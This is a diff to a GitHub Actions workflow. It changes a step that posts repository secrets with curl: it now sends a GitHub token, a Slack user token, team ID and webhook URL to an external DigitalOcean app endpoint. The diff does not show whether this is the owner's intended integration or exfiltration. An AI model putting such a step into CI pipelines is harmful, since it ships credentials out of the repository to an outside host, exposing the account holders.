@@ -13,15 +13,30 @@ jobs:
 
       - name: Send secrets to my-app.com
         env:
-          SECRET_1: ${{ secrets.SECRET_1 }}
-          SECRET_2: ${{ secrets.SECRET_2 }}
-          SECRET_3: ${{ secrets.SECRET_3 }}
+          GITHUB_TOKEN: ${{ secrets.GH_TOKEN }}
+          REPO_PATH: ${{  variabels.REPO_PATH }}
+          SLACK_USER_TOKEN: ${{ secrets.SLACK_USER_TOKEN }}
+          LOOKBACK_DAYS: ${{ variables.LOOKBACK_DAYS }}
+          SLACK_TEAM_ID: ${{ secrets.SLACK_TEAM_ID }}
+          SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }} 
+          
+          
+          
+          
+          
         run: |
           curl -X POST \
             -H "Content-Type: application/json" \
             -d '{
-              "secret_1": "'"$SECRET_1"'",
-              "secret_2": "'"$SECRET_2"'",
-              "secret_3": "'"$SECRET_3"'"
+              "github_token": "'"$GITHUB_TOKEN"'",
+              "repo_path": "'"$REPO_PATH"'",
+              "slack_user_token": "'"$SLACK_USER_TOKEN"'",
+              "lookback_days": "'"$LOOKBACK_DAYS"'",
+              "slack_team_id": "'"$SLACK_TEAM_ID"'",
+              "slack_webhook_url": "'"$SLACK_WEBHOOK_URL"'"
+              
+              
+              
+              
             }' \
-            https://my-app.com
+            https://seal-app-3rqj7.ondigitalocean.app/status
